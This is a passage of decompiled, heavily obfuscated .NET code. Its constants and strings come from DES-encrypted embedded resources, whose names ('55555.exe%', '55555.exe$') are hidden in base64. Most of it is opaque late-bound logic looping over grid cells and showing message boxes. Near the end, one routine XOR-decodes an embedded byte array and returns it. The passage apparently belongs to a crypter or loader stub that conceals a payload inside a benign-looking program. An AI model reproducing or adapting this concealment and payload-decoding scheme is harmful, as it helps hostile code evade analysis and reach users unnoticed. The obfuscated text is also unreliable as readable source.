							array8[_001E._000F(2836)] = (byte)_001E._000F(2840) != 0;
							object obj13 = _0013_000D._000F(obj3, null, text18, array16, null, null, array8);
							if (array8[_001E._000F(2844)])
							{
								obj4 = _0014._000F(array10[_001E._000F(2848)]);
							}
							if (_000C_000D._000F(obj13))
							{
								flag = (byte)_001E._000F(2852) != 0;
								array11 = new object[_001E._000F(2856)];
								array11[_001E._000F(2860)] = num;
								object obj14 = _0014_000D._000F(obj2, array11, null);
								string text19 = _0003._000F(1217);
								array10 = new object[_001E._000F(2864)];
								array10[_001E._000F(2868)] = (byte)_001E._000F(2872) != 0;
								_0007_000D._000F(obj14, null, text19, array10, null, null, null, (byte)_001E._000F(2876) != 0);
							}
							if (_000C_000D._000F(_0013_000D._000F(obj, null, _0003._000F(1001), new object[_001E._000F(2880)], null, null, null)))
							{
								object obj15 = obj4;
								string text20 = _0003._000F(826);
								array11 = new object[_001E._000F(2884)];
								array11[_001E._000F(2888)] = _0014._000F(_0013_000D._000F(obj, null, _0003._000F(1020), new object[_001E._000F(2892)], null, null, null));
								_001E_0016._000F(obj15, null, text20, array11, null, null);
								object obj16 = obj4;
								string text21 = _0003._000F(858);
								array11 = new object[_001E._000F(2896)];
								array11[_001E._000F(2900)] = _0014._000F(_0013_000D._000F(obj, null, _0003._000F(1049), new object[_001E._000F(2904)], null, null, null));
								_001E_0016._000F(obj16, null, text21, array11, null, null);
								object obj17 = obj4;
								string text22 = _0003._000F(890);
								array11 = new object[_001E._000F(2908)];
								array11[_001E._000F(2912)] = _0014._000F(_0013_000D._000F(obj, null, _0003._000F(1078), new object[_001E._000F(2916)], null, null, null));
								_001E_0016._000F(obj17, null, text22, array11, null, null);
								object obj18 = obj4;
								string text23 = _0003._000F(930);
								array11 = new object[_001E._000F(2920)];
								array11[_001E._000F(2924)] = _0014._000F(_0013_000D._000F(obj, null, _0003._000F(1107), new object[_001E._000F(2928)], null, null, null));
								_001E_0016._000F(obj18, null, text23, array11, null, null);
								string text24 = _0003._000F(972);
								array11 = new object[_001E._000F(2932)];
								array11[_001E._000F(2936)] = _0014._000F(obj4);
								array10 = array11;
								object[] array17 = array10;
								array8 = new bool[_001E._000F(2940)];
								array8[_001E._000F(2944)] = (byte)_001E._000F(2948) != 0;
								object obj19 = _0013_000D._000F(obj3, null, text24, array17, null, null, array8);
								if (array8[_001E._000F(2952)])
								{
									obj4 = _0014._000F(array10[_001E._000F(2956)]);
								}
								if (_000C_000D._000F(obj19))
								{
									object[] array2 = new object[_001E._000F(2960)];
									array2[_001E._000F(2964)] = num;
									object obj20 = _0014_000D._000F(obj2, array2, null);
									string text25 = _0003._000F(1217);
									array = new object[_001E._000F(2968)];
									array[_001E._000F(2972)] = (byte)_001E._000F(2976) != 0;
									_0007_000D._000F(obj20, null, text25, array, null, null, null, (byte)_001E._000F(2980) != 0);
								}
							}
						}
					}
					if (flag)
					{
						string text26 = _0003._000F(1236);
						array11 = new object[_001E._000F(2984)];
						array11[_001E._000F(2988)] = (byte)_001E._000F(2992) != 0;
						_0007_000D._000F(obj, null, text26, array11, null, null, null, (byte)_001E._000F(2996) != 0);
						if (_000C_000D._000F(_000E_000D._000F(obj21)))
						{
							array11 = new object[_001E._000F(3000)];
							array11[_001E._000F(3004)] = _001E._000F(3008);
							object obj23 = _0014_000D._000F(obj22, array11, null);
							string text27 = _0003._000F(1263);
							object[] array10 = new object[_001E._000F(3012)];
							array10[_001E._000F(3016)] = (byte)_001E._000F(3020) != 0;
							_0007_000D._000F(obj23, null, text27, array10, null, null, null, (byte)_001E._000F(3024) != 0);
						}
					}
				}
				int num10 = _001E._000F(3028);
				checked
				{
					object[] array11;
					do
					{
						int num11 = _001E._000F(3032);
						do
						{
							array11 = new object[_001E._000F(3036)];
							array11[_001E._000F(3040)] = num10;
							array11[_001E._000F(3044)] = num11;
							unchecked
							{
								if (_0014_000D._000F(obj24, array11, null) != null)
								{
									array11 = new object[_001E._000F(3048)];
									array11[_001E._000F(3052)] = num;
									if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(684), new object[_001E._000F(3056)], null, null, null)))
									{
										string text28 = _0003._000F(826);
										object[] array10 = new object[_001E._000F(3060)];
										object[] array18 = array10;
										int num12 = _001E._000F(3064);
										array11 = new object[_001E._000F(3068)];
										array11[_001E._000F(3072)] = num10;
										array11[_001E._000F(3076)] = num11;
										array18[num12] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj24, array11, null), null, _0003._000F(1149), new object[_001E._000F(3080)], null, null, null));
										_001E_0016._000F(obj3, null, text28, array10, null, null);
										string text29 = _0003._000F(858);
										array10 = new object[_001E._000F(3084)];
										object[] array19 = array10;
										int num13 = _001E._000F(3088);
										array11 = new object[_001E._000F(3092)];
										array11[_001E._000F(3096)] = num10;
										array11[_001E._000F(3100)] = num11;
										array19[num13] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj24, array11, null), null, _0003._000F(1166), new object[_001E._000F(3104)], null, null, null));
										_001E_0016._000F(obj3, null, text29, array10, null, null);
										string text30 = _0003._000F(890);
										array10 = new object[_001E._000F(3108)];
										object[] array20 = array10;
										int num14 = _001E._000F(3112);
										array11 = new object[_001E._000F(3116)];
										array11[_001E._000F(3120)] = num10;
										array11[_001E._000F(3124)] = num11;
										array20[num14] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj24, array11, null), null, _0003._000F(1183), new object[_001E._000F(3128)], null, null, null));
										_001E_0016._000F(obj3, null, text30, array10, null, null);
										string text31 = _0003._000F(930);
										array10 = new object[_001E._000F(3132)];
										object[] array21 = array10;
										int num15 = _001E._000F(3136);
										array11 = new object[_001E._000F(3140)];
										array11[_001E._000F(3144)] = num10;
										array11[_001E._000F(3148)] = num11;
										array21[num15] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj24, array11, null), null, _0003._000F(1200), new object[_001E._000F(3152)], null, null, null));
										_001E_0016._000F(obj3, null, text31, array10, null, null);
										object obj25 = obj4;
										string text32 = _0003._000F(826);
										array10 = new object[_001E._000F(3156)];
										object[] array22 = array10;
										int num16 = _001E._000F(3160);
										array11 = new object[_001E._000F(3164)];
										array11[_001E._000F(3168)] = num;
										array22[num16] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(1149), new object[_001E._000F(3172)], null, null, null));
										_001E_0016._000F(obj25, null, text32, array10, null, null);
										object obj26 = obj4;
										string text33 = _0003._000F(858);
										array10 = new object[_001E._000F(3176)];
										object[] array23 = array10;
										int num17 = _001E._000F(3180);
										array11 = new object[_001E._000F(3184)];
										array11[_001E._000F(3188)] = num;
										array23[num17] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(1166), new object[_001E._000F(3192)], null, null, null));
										_001E_0016._000F(obj26, null, text33, array10, null, null);
										object obj27 = obj4;
										string text34 = _0003._000F(890);
										array10 = new object[_001E._000F(3196)];
										object[] array24 = array10;
										int num18 = _001E._000F(3200);
										array11 = new object[_001E._000F(3204)];
										array11[_001E._000F(3208)] = num;
										array24[num18] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(1183), new object[_001E._000F(3212)], null, null, null));
										_001E_0016._000F(obj27, null, text34, array10, null, null);
										object obj28 = obj4;
										string text35 = _0003._000F(930);
										array10 = new object[_001E._000F(3216)];
										object[] array25 = array10;
										int num19 = _001E._000F(3220);
										array11 = new object[_001E._000F(3224)];
										array11[_001E._000F(3228)] = num;
										array25[num19] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(1200), new object[_001E._000F(3232)], null, null, null));
										_001E_0016._000F(obj28, null, text35, array10, null, null);
										string text36 = _0003._000F(972);
										array11 = new object[_001E._000F(3236)];
										array11[_001E._000F(3240)] = _0014._000F(obj4);
										array10 = array11;
										object[] array26 = array10;
										bool[] array8 = new bool[_001E._000F(3244)];
										array8[_001E._000F(3248)] = (byte)_001E._000F(3252) != 0;
										object obj29 = _0013_000D._000F(obj3, null, text36, array26, null, null, array8);
										if (array8[_001E._000F(3256)])
										{
											obj4 = _0014._000F(array10[_001E._000F(3260)]);
										}
										if (_000C_000D._000F(obj29))
										{
											array11 = new object[_001E._000F(3264)];
											array11[_001E._000F(3268)] = num;
											object obj30 = _0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(718), new object[_001E._000F(3272)], null, null, null);
											if (_0011_000D._000F(obj30, _001E._000F(3276), (byte)_001E._000F(3280) != 0))
											{
												obj31 = _0017_0016._000F(obj31, _001E._000F(3284));
												flag2 = (byte)_001E._000F(3288) != 0;
											}
											else if (_0011_000D._000F(obj30, _001E._000F(3292), (byte)_001E._000F(3296) != 0))
											{
												array11 = new object[_001E._000F(3300)];
												array11[_001E._000F(3304)] = num;
												object obj32 = _0014_000D._000F(obj2, array11, null);
												string text37 = _0003._000F(1278);
												array10 = new object[_001E._000F(3308)];
												array10[_001E._000F(3312)] = _001E._000F(3316);
												_0007_000D._000F(obj32, null, text37, array10, null, null, null, (byte)_001E._000F(3320) != 0);
											}
											else if (_0011_000D._000F(obj30, _001E._000F(3324), (byte)_001E._000F(3328) != 0))
											{
												flag2 = (byte)_001E._000F(3332) != 0;
												obj31 = _0017_0016._000F(obj31, _001E._000F(3336));
											}
											else if (_0011_000D._000F(obj30, _001E._000F(3340), (byte)_001E._000F(3344) != 0))
											{
												array11 = new object[_001E._000F(3348)];
												array11[_001E._000F(3352)] = num;
												object obj33 = _0014_000D._000F(obj2, array11, null);
												string text38 = _0003._000F(1278);
												array10 = new object[_001E._000F(3356)];
												array10[_001E._000F(3360)] = _001E._000F(3364);
												_0007_000D._000F(obj33, null, text38, array10, null, null, null, (byte)_001E._000F(3368) != 0);
											}
											else if (_0011_000D._000F(obj30, _001E._000F(3372), (byte)_001E._000F(3376) != 0))
											{
												array11 = new object[_001E._000F(3380)];
												array11[_001E._000F(3384)] = num;
												object obj34 = _0014_000D._000F(obj2, array11, null);
												string text39 = _0003._000F(1278);
												array10 = new object[_001E._000F(3388)];
												array10[_001E._000F(3392)] = _001E._000F(3396);
												_0007_000D._000F(obj34, null, text39, array10, null, null, null, (byte)_001E._000F(3400) != 0);
											}
											else if (_0011_000D._000F(obj30, _001E._000F(3404), (byte)_001E._000F(3408) != 0))
											{
												flag2 = (byte)_001E._000F(3412) != 0;
												obj31 = _0017_0016._000F(obj31, _001E._000F(3416));
												if (obj35 == null)
												{
													num11 = _001E._000F(3420);
													switch (num11)
													{
													case 0:
														if (_0011_000D._000F(_0013_000D._000F(obj, null, _0003._000F(1307), new object[_001E._000F(3424)], null, null, null), _001E._000F(3428), (byte)_001E._000F(3432) != 0))
														{
															flag3 = (byte)_001E._000F(3436) != 0;
														}
														break;
													case 1:
														if (_000C_000D._000F(_0013_000D._000F(obj, null, _0003._000F(1001), new object[_001E._000F(3440)], null, null, null)))
														{
															flag3 = (byte)_001E._000F(3444) != 0;
														}
														break;
													case 2:
														if (_0011_000D._000F(_0013_000D._000F(obj, null, _0003._000F(1307), new object[_001E._000F(3448)], null, null, null), _001E._000F(3452), (byte)_001E._000F(3456) != 0))
														{
															flag3 = (byte)_001E._000F(3460) != 0;
														}
														break;
													}
													if (!flag3)
													{
														_0015_0016._000F(_0003._000F(1342), (MsgBoxStyle)_001E._000F(3464), null);
													}
												}
											}
											if (flag2)
											{
												array11 = new object[_001E._000F(3468)];
												array11[_001E._000F(3472)] = num;
												object obj36 = _0014_000D._000F(obj2, array11, null);
												string text40 = _0003._000F(1217);
												array10 = new object[_001E._000F(3476)];
												array10[_001E._000F(3480)] = (byte)_001E._000F(3484) != 0;
												_0007_000D._000F(obj36, null, text40, array10, null, null, null, (byte)_001E._000F(3488) != 0);
												flag2 = (byte)_001E._000F(3492) != 0;
												if (_000C_000D._000F(_000E_000D._000F(obj21)))
												{
													array11 = new object[_001E._000F(3496)];
													array11[_001E._000F(3500)] = _001E._000F(3504);
													object obj37 = _0014_000D._000F(obj22, array11, null);
													string text41 = _0003._000F(1263);
													array10 = new object[_001E._000F(3508)];
													array10[_001E._000F(3512)] = (byte)_001E._000F(3516) != 0;
													_0007_000D._000F(obj37, null, text41, array10, null, null, null, (byte)_001E._000F(3520) != 0);
												}
											}
											array11 = new object[_001E._000F(3524)];
											array11[_001E._000F(3528)] = num10;
											array11[_001E._000F(3532)] = num11;
											array11[_001E._000F(3536)] = null;
											_0020_0016._000F(obj24, array11, null);
										}
									}
								}
							}
							num11 += _001E._000F(3540);
						}
						while (num11 <= _001E._000F(3544));
						num10 += _001E._000F(3548);
					}
					while (num10 <= _001E._000F(3552));
					array11 = new object[_001E._000F(3556)];
					array11[_001E._000F(3560)] = num;
					if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(684), new object[_001E._000F(3564)], null, null, null))))
					{
						num20 += _001E._000F(3568);
					}
				}
				if (num20 == _001E._000F(3572))
				{
					string text42 = _0003._000F(1347);
					object[] array11 = new object[_001E._000F(3576)];
					array11[_001E._000F(3580)] = (byte)_001E._000F(3584) != 0;
					_0007_000D._000F(obj, null, text42, array11, null, null, null, (byte)_001E._000F(3588) != 0);
					break;
				}
				num = checked(num + _001E._000F(3592));
			}
			while (num <= _001E._000F(3596));
		}
		catch (Exception ex)
		{
			_0009_0016._000F(ex);
			_0008_000D._000F();
		}
	}

	public static object _001D(object _000F)
	{
		return _0017(_001E._000F(3600));
	}

	public static object _000F(byte[] _000F, int _000D, byte[] _0016)
	{
		_0004_0016._000F(_000F, _000D, _0016, _001E._000F(3604), _0016.Length);
		object result = default(object);
		return result;
	}

	public static object _0017(object _000F)
	{
		try
		{
			object obj = default(object);
			if (_0019_0016._000F(obj, _001E._000F(3608), (byte)_001E._000F(3612) != 0))
			{
				object obj2 = default(object);
				int num = _0005_0016._000F(obj2);
				object obj3 = default(object);
				int num2 = _0005_0016._000F(obj3);
				object obj4 = default(object);
				object obj6 = default(object);
				object obj7 = default(object);
				object obj10 = default(object);
				object obj11 = default(object);
				for (int i = num; i <= num2; i = checked(i + _001E._000F(4196)))
				{
					int num3 = _001E._000F(3616);
					do
					{
						object obj5 = obj4;
						if (_0011_000D._000F(obj5, _001E._000F(3620), (byte)_001E._000F(3624) != 0))
						{
							object[] array = new object[_001E._000F(3628)];
							array[_001E._000F(3632)] = _0017_0016._000F(_0017_0016._000F(i, obj6), checked(num3 * _001E._000F(3636)));
							if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj7, array, null), null, _0003._000F(396), new object[_001E._000F(3640)], null, null, null))))
							{
								array = new object[_001E._000F(3644)];
								array[_001E._000F(3648)] = _0017_0016._000F(i, obj6);
								object obj8 = _0014_000D._000F(obj7, array, null);
								string text = _0003._000F(413);
								object[] array2 = new object[_001E._000F(3652)];
								object[] array3 = array2;
								int num4 = _001E._000F(3656);
								string text2 = _0003._000F(422);
								object[] array4 = new object[_001E._000F(3660)];
								object[] array5 = array4;
								int num5 = _001E._000F(3664);
								object obj9 = _001E._000F(3668);
								object[] array6 = new object[_001E._000F(3672)];
								array6[_001E._000F(3676)] = i;
								array5[num5] = _000F_0016._000F(obj9, _0014_000D._000F(obj10, array6, null));
								array3[num4] = _000F_0016._000F(_0013_000D._000F(obj11, null, text2, array4, null, null, null), _001E._000F(3680));
								_0007_000D._000F(obj8, null, text, array2, null, null, null, (byte)_001E._000F(3684) != 0);
								array2 = new object[_001E._000F(3688)];
								array2[_001E._000F(3692)] = _0017_0016._000F(i, obj6);
								object obj12 = _0014_000D._000F(obj7, array2, null);
								string text3 = _0003._000F(459);
								array = new object[_001E._000F(3696)];
								object[] array7 = array;
								int num6 = _001E._000F(3700);
								string text4 = _0003._000F(468);
								array6 = new object[_001E._000F(3704)];
								object[] array8 = array6;
								int num7 = _001E._000F(3708);
								object obj13 = _001E._000F(3712);
								array4 = new object[_001E._000F(3716)];
								array4[_001E._000F(3720)] = i;
								array8[num7] = _000F_0016._000F(obj13, _0014_000D._000F(obj10, array4, null));
								array7[num6] = _000F_0016._000F(_0013_000D._000F(obj11, null, text4, array6, null, null, null), _001E._000F(3724));
								_0007_000D._000F(obj12, null, text3, array, null, null, null, (byte)_001E._000F(3728) != 0);
								array2 = new object[_001E._000F(3732)];
								array2[_001E._000F(3736)] = _0017_0016._000F(i, _0017_0016._000F(obj6, _001E._000F(3740)));
								object obj14 = _0014_000D._000F(obj7, array2, null);
								string text5 = _0003._000F(413);
								object[] array9 = new object[_001E._000F(3744)];
								object[] array10 = array9;
								int num8 = _001E._000F(3748);
								string text6 = _0003._000F(505);
								array6 = new object[_001E._000F(3752)];
								object[] array11 = array6;
								int num9 = _001E._000F(3756);
								array4 = new object[_001E._000F(3760)];
								array4[_001E._000F(3764)] = i;
								array11[num9] = _0014._000F(_0014_000D._000F(obj10, array4, null));
								array = array6;
								object[] array12 = array;
								bool[] array13 = new bool[_001E._000F(3768)];
								array13[_001E._000F(3772)] = (byte)_001E._000F(3776) != 0;
								object obj15 = _0013_000D._000F(obj11, null, text6, array12, null, null, array13);
								object[] array14;
								if (array13[_001E._000F(3780)])
								{
									array14 = new object[_001E._000F(3784)];
									array14[_001E._000F(3788)] = i;
									array14[_001E._000F(3792)] = _0014._000F(array[_001E._000F(3796)]);
									_0006_0016._000F(obj10, array14, null, (byte)_001E._000F(3800) != 0, (byte)_001E._000F(3804) != 0);
								}
								array10[num8] = _0017_0016._000F(obj15, _001E._000F(3808));
								_0007_000D._000F(obj14, null, text5, array9, null, null, null, (byte)_001E._000F(3812) != 0);
								array9 = new object[_001E._000F(3816)];
								array9[_001E._000F(3820)] = _0017_0016._000F(i, _0017_0016._000F(obj6, _001E._000F(3824)));
								object obj16 = _0014_000D._000F(obj7, array9, null);
								string text7 = _0003._000F(459);
								array = new object[_001E._000F(3828)];
								object[] array15 = array;
								int num10 = _001E._000F(3832);
								string text8 = _0003._000F(544);
								array2 = new object[_001E._000F(3836)];
								object[] array16 = array2;
								int num11 = _001E._000F(3840);
								array14 = new object[_001E._000F(3844)];
								array14[_001E._000F(3848)] = i;
								array16[num11] = _0014._000F(_0014_000D._000F(obj10, array14, null));
								array4 = array2;
								object[] array17 = array4;
								array13 = new bool[_001E._000F(3852)];
								array13[_001E._000F(3856)] = (byte)_001E._000F(3860) != 0;
								object obj17 = _0013_000D._000F(obj11, null, text8, array17, null, null, array13);
								if (array13[_001E._000F(3864)])
								{
									array6 = new object[_001E._000F(3868)];
									array6[_001E._000F(3872)] = i;
									array6[_001E._000F(3876)] = _0014._000F(array4[_001E._000F(3880)]);
									_0006_0016._000F(obj10, array6, null, (byte)_001E._000F(3884) != 0, (byte)_001E._000F(3888) != 0);
								}
								array15[num10] = _000F_0016._000F(obj17, _001E._000F(3892));
								_0007_000D._000F(obj16, null, text7, array, null, null, null, (byte)_001E._000F(3896) != 0);
							}
							int num12 = _001E._000F(3900);
						}
						else if (_0011_000D._000F(obj5, _001E._000F(3904), (byte)_001E._000F(3908) != 0))
						{
							object[] array9 = new object[_001E._000F(3912)];
							array9[_001E._000F(3916)] = _0017_0016._000F(_0017_0016._000F(i, obj6), checked(num3 * _001E._000F(3920)));
							if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj7, array9, null), null, _0003._000F(396), new object[_001E._000F(3924)], null, null, null))))
							{
								array9 = new object[_001E._000F(3928)];
								array9[_001E._000F(3932)] = _0017_0016._000F(i, obj6);
								object obj18 = _0014_000D._000F(obj7, array9, null);
								string text9 = _0003._000F(413);
								object[] array = new object[_001E._000F(3936)];
								object[] array18 = array;
								int num13 = _001E._000F(3940);
								string text10 = _0003._000F(422);
								object[] array2 = new object[_001E._000F(3944)];
								object[] array19 = array2;
								int num14 = _001E._000F(3948);
								object[] array14 = new object[_001E._000F(3952)];
								array14[_001E._000F(3956)] = i;
								array19[num14] = _0014._000F(_0014_000D._000F(obj10, array14, null));
								object[] array4 = array2;
								object[] array20 = array4;
								bool[] array13 = new bool[_001E._000F(3960)];
								array13[_001E._000F(3964)] = (byte)_001E._000F(3968) != 0;
								object obj19 = _0013_000D._000F(obj11, null, text10, array20, null, null, array13);
								if (array13[_001E._000F(3972)])
								{
									object[] array6 = new object[_001E._000F(3976)];
									array6[_001E._000F(3980)] = i;
									array6[_001E._000F(3984)] = _0014._000F(array4[_001E._000F(3988)]);
									_0006_0016._000F(obj10, array6, null, (byte)_001E._000F(3992) != 0, (byte)_001E._000F(3996) != 0);
								}
								array18[num13] = _000F_0016._000F(obj19, _001E._000F(4000));
								_0007_000D._000F(obj18, null, text9, array, null, null, null, (byte)_001E._000F(4004) != 0);
								array9 = new object[_001E._000F(4008)];
								array9[_001E._000F(4012)] = _0017_0016._000F(i, obj6);
								object obj20 = _0014_000D._000F(obj7, array9, null);
								string text11 = _0003._000F(459);
								array = new object[_001E._000F(4016)];
								object[] array21 = array;
								int num15 = _001E._000F(4020);
								string text12 = _0003._000F(468);
								array2 = new object[_001E._000F(4024)];
								object[] array22 = array2;
								int num16 = _001E._000F(4028);
								array14 = new object[_001E._000F(4032)];
								array14[_001E._000F(4036)] = i;
								array22[num16] = _0014._000F(_0014_000D._000F(obj10, array14, null));
								array4 = array2;
								object[] array23 = array4;
								array13 = new bool[_001E._000F(4040)];
								array13[_001E._000F(4044)] = (byte)_001E._000F(4048) != 0;
								object obj21 = _0013_000D._000F(obj11, null, text12, array23, null, null, array13);
								if (array13[_001E._000F(4052)])
								{
									object[] array6 = new object[_001E._000F(4056)];
									array6[_001E._000F(4060)] = i;
									array6[_001E._000F(4064)] = _0014._000F(array4[_001E._000F(4068)]);
									_0006_0016._000F(obj10, array6, null, (byte)_001E._000F(4072) != 0, (byte)_001E._000F(4076) != 0);
								}
								array21[num15] = _000F_0016._000F(obj21, _001E._000F(4080));
								_0007_000D._000F(obj20, null, text11, array, null, null, null, (byte)_001E._000F(4084) != 0);
								array9 = new object[_001E._000F(4088)];
								array9[_001E._000F(4092)] = _0017_0016._000F(i, _0017_0016._000F(obj6, _001E._000F(4096)));
								object obj22 = _0014_000D._000F(obj7, array9, null);
								string text13 = _0003._000F(413);
								array4 = new object[_001E._000F(4100)];
								object[] array24 = array4;
								int num17 = _001E._000F(4104);
								string text14 = _0003._000F(505);
								array2 = new object[_001E._000F(4108)];
								object[] array25 = array2;
								int num18 = _001E._000F(4112);
								object obj23 = _001E._000F(4116);
								array14 = new object[_001E._000F(4120)];
								array14[_001E._000F(4124)] = i;
								array25[num18] = _000F_0016._000F(obj23, _0014_000D._000F(obj10, array14, null));
								array24[num17] = _0017_0016._000F(_0013_000D._000F(obj11, null, text14, array2, null, null, null), _001E._000F(4128));
								_0007_000D._000F(obj22, null, text13, array4, null, null, null, (byte)_001E._000F(4132) != 0);
								array9 = new object[_001E._000F(4136)];
								array9[_001E._000F(4140)] = _0017_0016._000F(i, _0017_0016._000F(obj6, _001E._000F(4144)));
								object obj24 = _0014_000D._000F(obj7, array9, null);
								string text15 = _0003._000F(459);
								array4 = new object[_001E._000F(4148)];
								object[] array26 = array4;
								int num19 = _001E._000F(4152);
								string text16 = _0003._000F(544);
								array2 = new object[_001E._000F(4156)];
								object[] array27 = array2;
								int num20 = _001E._000F(4160);
								object obj25 = _001E._000F(4164);
								array14 = new object[_001E._000F(4168)];
								array14[_001E._000F(4172)] = i;
								array27[num20] = _000F_0016._000F(obj25, _0014_000D._000F(obj10, array14, null));
								array26[num19] = _000F_0016._000F(_0013_000D._000F(obj11, null, text16, array2, null, null, null), _001E._000F(4176));
								_0007_000D._000F(obj24, null, text15, array4, null, null, null, (byte)_001E._000F(4180) != 0);
							}
							int num12 = _001E._000F(4184);
						}
						num3 = checked(num3 + _001E._000F(4188));
					}
					while (num3 <= _001E._000F(4192));
				}
			}
		}
		catch (Exception ex)
		{
			_0009_0016._000F(ex);
			Exception ex2 = ex;
			_0008_000D._000F();
		}
		byte[] array28 = (byte[])A._0017._000F();
		int num21 = _001E._000F(4200);
		checked
		{
			byte[] array29 = new byte[array28.Length - num21 - _001E._000F(4204) + _001E._000F(4208)];
			A._0017._000F(array28, num21, array29);
			int num22 = _001E._000F(4212);
			int num23 = array29.Length - _001E._000F(4216);
			for (int j = num22; j <= num23; j += _001E._000F(4220))
			{
				array29[j] = unchecked((byte)(array29[j] ^ array28[j % num21]));
			}
			return array29;
		}
	}
}
[StandardModule]
internal sealed class _0010
{
	[STAThread]
	public static void _000F()
	{
		_0004._000F();
		_0001._000F();
		_0017._000F();
	}
}
internal class _001E
{
	internal static readonly byte[] _000F;

	internal readonly int _000F;

	static _001E()
	{
		if (_001E._000F == null)
		{
			string s = "NTU1NTUuZXhlJQ==";
			byte[] array = Convert.FromBase64String(s);
			s = Encoding.UTF8.GetString(array, 0, array.Length);
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(s);
			_001E._000F = _000B._000F(97L, manifestResourceStream);
		}
	}

	internal static int _000F(int _000F)
	{
		return BitConverter.ToInt32(_001E._000F, _000F);
	}

	internal static long _000F(int _000F)
	{
		return BitConverter.ToInt64(_001E._000F, _000F);
	}

	internal static float _000F(int _000F)
	{
		return BitConverter.ToSingle(_001E._000F, _000F);
	}

	internal static double _000F(int _000F)
	{
		return BitConverter.ToDouble(_001E._000F, _000F);
	}

	internal static void _000F(Array _000F, int _000D)
	{
		int num = 0;
		if ((_001E._000F[_000D] & 0x80) == 0)
		{
			num = _001E._000F[_000D];
			_000D++;
		}
		else if ((_001E._000F[_000D] & 0x40) == 0)
		{
			num = (_001E._000F[_000D] & -129) << 8;
			num |= _001E._000F[_000D + 1];
			_000D += 2;
		}
		else
		{
			num = (_001E._000F[_000D] & -193) << 24;
			num |= _001E._000F[_000D + 1] << 16;
			num |= _001E._000F[_000D + 2] << 8;
			num |= _001E._000F[_000D + 3];
			_000D += 4;
		}
		if (num >= 1)
		{
			Buffer.BlockCopy(_001E._000F, _000D, _000F, 0, num);
		}
	}
}
internal class _0003
{
	internal static readonly byte[] _000F;

	static _0003()
	{
		if (_0003._000F == null)
		{
			string s = "NTU1NTUuZXhlJA==";
			byte[] array = Convert.FromBase64String(s);
			s = Encoding.UTF8.GetString(array, 0, array.Length);
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(s);
			_0003._000F = _000B._000F(97L, manifestResourceStream);
		}
	}

	internal static string _000F(int _000F)
	{
		int num = 0;
		if ((_0003._000F[_000F] & 0x80) == 0)
		{
			num = _0003._000F[_000F];
			_000F++;
		}
		else if ((_0003._000F[_000F] & 0x40) == 0)
		{
			num = (_0003._000F[_000F] & -129) << 8;
			num |= _0003._000F[_000F + 1];
			_000F += 2;
		}
		else
		{
			num = (_0003._000F[_000F] & -193) << 24;
			num |= _0003._000F[_000F + 1] << 16;
			num |= _0003._000F[_000F + 2] << 8;
			num |= _0003._000F[_000F + 3];
			_000F += 4;
		}
		if (num < 1)
		{
			return string.Empty;
		}
		string @string = Encoding.Unicode.GetString(_0003._000F, _000F, num);
		return string.Intern(@string);
	}
}
internal class _000B
{
	private static readonly object m__000F;

	private static readonly int m__000F;

	private static readonly int _000D;

	private static readonly MemoryStream m__000F;

	private static readonly MemoryStream _000D;

	private static readonly byte m__000F;

	static _000B()
	{
		_000B.m__000F = null;
		_000D = null;
		_000B.m__000F = int.MaxValue;
		_000B._000D = int.MinValue;
		_000B.m__000F = _000D_0015._000F(0);
		_000D = _000D_0015._000F(0);
		_000B.m__000F = _000F_0015._000F();
	}

	private static string _000F(Assembly _000F)
	{
		string text = _0020_0015._000F(_000F);
		int num = _0015_0015._000F(text, ',');
		if (num >= 0)
		{
			text = _0016_0015._000F(text, 0, num);
		}
		return text;
	}

	private static byte[] _000F(Assembly _000F)
	{
		try
		{
			string text = _0020_0015._000F(_000F);
			int num = _0019_0015._000F(text, "PublicKeyToken=");
			if (num < 0)
			{
				num = _0019_0015._000F(text, "publickeytoken=");
			}
			if (num < 0)
			{
				return null;
			}
			num += 15;
			if (_0018_0015._000F(text, num) == 'n' || _0018_0015._000F(text, num) == 'N')
			{
				return null;
			}
			string text2 = _0016_0015._000F(text, num, 16);
			long num2 = _0010_0015._000F(text2, NumberStyles.HexNumber);
			byte[] array = _0017_0015._000F(num2);
			_001D_0015._000F(array);
			return array;
		}
		catch
		{
		}
		return null;
	}

	internal static byte[] _000F(Stream _000F)
	{
		object obj;
		_0006_0015._000F(obj = _000B.m__000F);
		try
		{
			return _000B._000F(97L, (object)_000F);
		}
		finally
		{
			_001C_0015._000F(obj);
		}
	}

	internal static byte[] _000F(long _000F, Stream _000D)
	{
		try
		{
			return _000B._000F(_000D);
		}
		catch
		{
			return _000B._000F(97L, (object)_000D);
		}
	}

	internal static byte[] _000F(long _000F, object _000D)
	{
		Stream stream = _000D as Stream;
		Stream stream2 = stream;
		MemoryStream memoryStream = null;
		for (int i = 1; i < 4; i++)
		{
			_000E_0015._000F(stream);
		}
		ushort num = (ushort)_000E_0015._000F(stream);
		num = (ushort)(~num);
		if ((num & 2u) != 0)
		{
			DESCryptoServiceProvider dESCryptoServiceProvider = _000C_0015._000F();
			byte[] array = new byte[8];
			_0005_0015._000F(stream, array, 0, 8);
			_0014_0015._000F(dESCryptoServiceProvider, array);
			byte[] array2 = new byte[8];
			_0005_0015._000F(stream, array2, 0, 8);
			bool flag = true;
			byte[] array3 = array2;
			for (int j = 0; j < array3.Length; j++)
			{
				if (array3[j] != 0)
				{
					flag = false;
					break;
				}
			}
			if (flag)
			{
				array2 = _000B._000F(_0007_0015._000F());
			}
			_000A_0015._000F(dESCryptoServiceProvider, array2);
			if (_000B.m__000F == null)
			{
				if (_000B.m__000F == int.MaxValue)
